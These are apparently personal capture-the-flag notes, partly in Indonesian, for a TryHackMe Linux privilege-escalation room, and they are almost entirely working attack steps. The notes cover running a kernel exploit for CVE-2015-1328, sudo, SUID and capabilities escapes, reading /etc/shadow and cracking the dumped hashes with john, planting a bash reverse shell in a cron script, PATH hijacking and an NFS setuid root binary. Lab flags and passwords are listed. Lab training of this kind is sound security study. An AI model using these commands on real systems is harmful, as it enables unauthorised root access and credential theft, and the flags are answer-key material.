## SSH
>> ssh username@ip_add

[=]  Task 3  [=]

## Hostname
>. hostname

## Linux kernel version
>. uname -a
>. cat /proc/version

## What Linux is this
>. cat /etc/issue

## Python version
>. python --version

[=]  Task 5 - PrivEsc via Kernel Exploits  [=]

## Kernel vuln
-- Cari CVE (2015-1328)
-- Download exploit
-- copy hasil download
   >> mv 37292.c ../CTF/TryHackMe/linux-privilege-escalation

## Compile exploit
>> gcc 37292.c -o ofs
   -- Error pas compile :v

## Find another exploit
-- https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/ofs_32
-- copy exploit 
   >> mv ofs_32 ../CTF/TryHackMe/linux-privilege-escalation

## Start local server
>> sudo python3 -m http.server

## Transfer exploit from local to target machine
>. cd tmp
>. wget http://{vpn_ip}:8000/ofs_32
wget http://10.18.201.241:8000/exp

## Check file permission
>. ls -la

## Change exploit permission
>. chmod +x ofs_32

## Run exploit
>. ./ofs_32
   -- SUCCESS :)

## Change directory
>. cd /home

## Check id root
>. id

## Find flag
THM-28392872729920

[=]  Task 6 - PrivEsc via Sudo  [=]

## Connect SSH

## Sudo Program Check
>> sudo -l
   -- Ada 3 program yang bisa dieksekusi oleh karen dengan sudo

## Exploit
   -- Pilih salah satu program (misal nano)
   -- Kunjungi GTFOBins untuk menjalankan exploit
      https://gtfobins.github.io/#wget
   -- Search nano, pilih sudo
   -- Ikuti langkah-langkahnya
      >> sudo nano
      >> CTRL+R
      >> CTRL+X
      >> reset; sh 1>&0 2>&0
         -- SUCCESS :)

## Find Flag
THM-402028394

## Find other user
>> cat /etc/shadow
   -- Frank hash = $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1


[=]  Task 7 - PrivEsc via SUID  [=]

## Find SUID Program that can be used
>. find / -type f -perm -04000 -ls 2>/dev/null

## Choose program to exploit
-- Example : base64 (/usr/bin/bash64)

## Exploit
-- Find in GTFOBins
>. LFILE={file_to_read}
   -- Misal ingin cek user di /etc/shadow
   -- LFILE=/etc/shadow
>. /usr/bin/base64 "$LFILE" | base64 --decode
   -- SUCCESS :)

## Hash user2 pwd
-- pwd = $6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
-- save pwd ke file
   >> echo "$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/" > user2.txt

>> john --wordlist=/usr/share/wordlists/rockyou.txt  user2.txt
>> john user2.txt --show
   -- pwd = Password1

## Find Flag
-- Permission denied to "cat" the flag3
-- Use Same exploit
   >. LFILE=/home/ubuntu/flag3.txt
   >. /usr/bin/base64 "$LFILE" | base64 --decode
      -- THM-3847834

[=]  Task 8 - PrivEsc via Capabilities  [=]

## Find Capability program that can be used
>. getcap -r / 2>/dev/null

## Choose program to exploit
-- Example : view (/home/ubuntu/view)

## Exploit
-- Find in GTFOBins
>. /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
   -- SUCCESS :)

## Find Flag
THM-9349843


[=]  Task 9 - PrivEsc via Cron Jobs  [=]

## Find cronjob
>. cat /etc/crontab

## Exploit
-- Pilih satu cronjob untuk diexploit
   -- Misal : backup.sh (/home/karen/backup.sh)
-- Jalankan local port dengan netcat
   >. sudo nc -nvlp 1337
-- Modifikasi file backup.sh
   >. nano /home/karen/backup.sh
      #!/bin/bash
      bash -i >& /dev/tcp/{ip_vpn}/{local_port_nc} 0>&1
   -- save
      CTRL + X -> Y -> Enter
-- Ubah permission
   >. chmod +x /home/karen/backup.sh
   -- Tunggu koneksi terhubung ke netcat
   -- SUCCESS :)

## Find Flag
THM-383000283

## Find other user credentials
>. cat /etc/shadow
-- pwd : $6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.

## Hash password
>. john --wordlist=/usr/share/wordlists/rockyou.txt matt.txt
-- pwd = 123456


[=]  Task 10 - PrivEsc via Path  [=]

## Check Path
>. echo $PATH

## Modify Path, add /tmp
>. export PATH=/tmp:$PATH
>. echo $PATH

## Exploit
>. ./test
   -- error karena tidak ada file thm

## Add thm file in tmp (coz tmp is easier to write)
-- Cek permission di tmp
   >. ls -la /tmp
>. cd /tmp
>. nano thm
   /bin/bash
-- Change thm permission
   >. chmod 777 thm

## Exploit
>. cd /home/murdoch
>. ./test
   -- SUCCESS :)

## Find Flag
-- THM-736628929


[=]  Task 11 - PrivEsc via NFS  [=]

## Check NFS configuration
>. cat /etc/exports
   -- cari yg ada flag 'rw' & 'no_root_squash'

## Enumerate mountable shares
>> showmount -e {target_machine_ip}

## Change to superuser in local machine
>> sudo su

## Make a folder to share, in '/' directory
>> cd /
>> mkdir mount
>> cd mount
>> mkdir linprivesc

## Connect shared folder from local to target machine
>> mount -o rw {target_machine_ip}:{mount_shared_folder} {local_folder}
>> mount -o rw 10.10.76.18:/home/ubuntu/sharedfolder /mount/linprivesc

## Exploit
-- Write exploit
   >> nano code.c
      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      int main (void) {
         setuid(0);
         setgid(0);
         system("/bin/bash -p");
         return 0;
      } 
-- Compile code
   >> gcc code.c -o code

## Go to shared folder in target machine
>. cd /home/ubuntu/sharedfolder
-- Change permission (from local machine)
   >> chmod +x code


[=]  Capstone Challenge  [=]

## PrivEsc via SUID
>. find / -type f -perm -04000 -ls 2>/dev/null
>. LFILE=/etc/shadow
>. /usr/bin/base64 "$LFILE" | base64 --decode

## Crack missy password
>> john --wordlist=/usr/share/wordlists/rockyou.txt massy.txt

## Change user to missy
>. su missy
   -- password = Password1

## PrivEsc via Sudo
>. sudo /usr/bin/find . -exec /bin/sh \; -quit

## Find Flag !!